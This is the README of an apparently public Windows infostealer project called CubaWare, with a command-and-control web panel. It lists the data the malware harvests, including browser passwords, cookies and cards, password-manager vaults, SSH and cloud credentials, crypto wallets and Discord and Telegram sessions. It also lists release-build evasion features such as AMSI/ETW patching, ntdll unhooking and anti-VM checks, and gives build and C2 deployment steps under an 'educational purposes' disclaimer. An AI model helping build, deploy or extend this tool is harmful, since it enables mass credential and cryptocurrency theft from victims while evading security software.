# CubaWare

CubaWare is a Windows infostealer project, made for learning and educational purposes. It was initially started as a recode for [Melon Stealer](https://github.com/flaxyaw/Melon-Stealer)

For technique writeups see [docs/techniques.md](docs/techniques.md). For flow diagrams see [docs/](docs/).

---

## Issues & Pull Requests

[Issues](https://github.com/flaxyaw/CubaWare/issues) and [Pull Requests](https://github.com/flaxyaw/CubaWare/pulls) are appreciated, but may take a while to be reviewed or approved.

Please **do not** open issues related to the following:

- AV / EDR detections (e.g. _“how do I make this undetectable?”, “it’s detected, can you update it?”)
    
- RAT functionality (e.g. camera access, keylogging, etc.)
    
- Windows updates (e.g. _“broken on some Windows version / exotic setup”_)

## Contributions

* Do **NOT** expect fixes. If your issue does not get resolved, solve it yourself and contribute.

- If you would like to contribute follow this guide:
1. Open a issue asking whether the change is wanted
2. Fork the repo
3. Implement the fix / change / feature
4. Open a pull request

## Features

**Browsers (Chromium (including Chrome 127+ & Gecko)**
	Passwords, cookies, history, autofill form data, addresses, CCs etc.


**Credentials**
	Windows Credential Manager, PuTTY saved sessions, RDP saved hosts, Outlook/Office tokens.

**Password managers**
	KeePass (.kdbx + config, Documents/Desktop scan), KeePass2, KeePassXC, mRemoteNG, Bitwarden, 1Password, NordPass, Dashlane.

**System**
	Screenshot, clipboard, WiFi passwords (wlanapi dynamic load), SSH keys (~/.ssh/).

**Dev tools**
	VS Code / VS Codium / Cursor, JetBrains credential store, AWS CLI (~/.aws/), GCP (~/.config/gcloud/), git credential store.

**Crypto**
	Browser extension wallets (MetaMask, Phantom, Coinbase, Trust, Ronin, TronLink, Keplr, Exodus, Yoroi, Math Wallet, Solflare, OKX, Rabby, TokenPocket, Uniswap, Station, BNB Chain, OneKey), cold wallet seed file scan, desktop wallets (Electrum, Exodus, Atomic, Guarda, Jaxx, Coinomi).

**Comms**
	Discord (DPAPI + AES-GCM token decryption), Telegram (tdata session tree).

**Network / server**
	FTP clients (FileZilla, WinSCP, Cyberduck), VPN configs (OpenVPN, NordVPN, ProtonVPN, Mullvad).

**Gaming**
	Steam (loginusers.vdf + ssfn*), Epic Games, Riot Games.

**Other**
Notepad++ backup files, mail client data

---

## Build environment

A linux host is **required** to build this project. Development took place on Fedora, yet to test a VPS, VM or WSL.

Native Windows with MSYS2/MinGW64 is possible but requires toolchain changes (remove `cmake/toolchain-mingw.cmake`, use native g++ target).


**Toolchain:**

Fedora / RHEL:
```bash
sudo dnf install cmake ninja-build mingw64-gcc mingw64-gcc-c++ mingw64-zlib-static openssl
```

Ubuntu / Debian:
```bash
sudo apt install cmake ninja-build gcc-mingw-w64-x86-64 g++-mingw-w64-x86-64 openssl
```

**Panel runtime (both build host and C2 server):**
```bash
curl -fsSL https://bun.sh/install | bash
```

---

## Quick start

```bash
git clone https://github.com/flaxyaw/CubaWare #feel free to use HTTPS, SSH, Github CLI or similar. 
cd CubaWare
./panel.sh
```

First run should detect missing dependencies and calls `panel/setup.sh` automatically. Both services start when setup finishes.

Panel: `http://localhost:3000`  log in with **admin / admin** and change the password.

See [setup.md](setup.md) for full VPS deployment.

---

## Debug vs release

|                          | debug    | release                        |
| ------------------------ | -------- | ------------------------------ |
| Console window           | yes      | no                             |
| Evasion pipeline         | off      | on                             |
| TLS callback anti-debug  | off      | on                             |
| ntdll unhook             | off      | on                             |
| ETW / AMSI patch         | off      | on                             |
| PE header wipe           | off      | on                             |
| PPID spoof               | off      | on                             |
| Anti-VM / anti-targeting | off      | on                             |
| IAT hardening            | no       | yes                            |
| Per-build POLY constants | no       | yes                            |
| PE postprocessing        | no       | yes                            |
| Symbols                  | included | stripped                       |
| Section names            | stock    | `.text→.ndata` `.rdata→.mdata` |
| Optimisation             | `-O0 -g` | `-O3 -ffunction-sections -s`   |

---

## Panel operations

**Reset DB:**
```bash
cd panel/server
rm src/database/cubaware.sqlite
DB_FILE_NAME=./src/database/cubaware.sqlite bun run migrate
DB_FILE_NAME=./src/database/cubaware.sqlite bun run seed
```

**Rotating API keys with old builds:**
Update `CUBACLIENT_API_KEY` in `panel/server/.env`, restart `panel.sh` (or through the UI). Binaries built against the old key will be rejected!


---

# Special shoutouts:

#### Soider 
> Thank you soider for making the entire panel and motivating me to finish this project. 

#### PTCruiser 
> Immense help in API hashing, PEB walking stuff and Chrome ABE implementation.

#### Mossad Agent / 0xYahu
> API hashing and anti analysis

#### *** 
> CRAZY help on anti analysis and some crypto things i dont remember.

#### Meckazin
> Initial poster of ChromeKatz

#### AI
> Research and explanations, debugging, scripting, documentation.


## Contact & Future updates

#### Intent
I may update this project when trying out new tactics or similar that i deem interesting enough to share with the world. I may create graphics or notes used if i feel like it. (check /docs)

#### Contact
Feel free to contact me regarding this, or other projects through the following channels:

XMPP: fakehead@conversations.im (rather inactive)
Matrix: [@fakehead:matrix.org](https://matrix.to/#/@fakehead:matrix.org)
Email: [sqli@420blaze.it](mailto:sqli@420blaze.it)



See `LICENSE` for usage terms This project is provided as-is for educational purposes only.  
The author is not responsible for misuse, damage, or legal consequences resulting from its use.
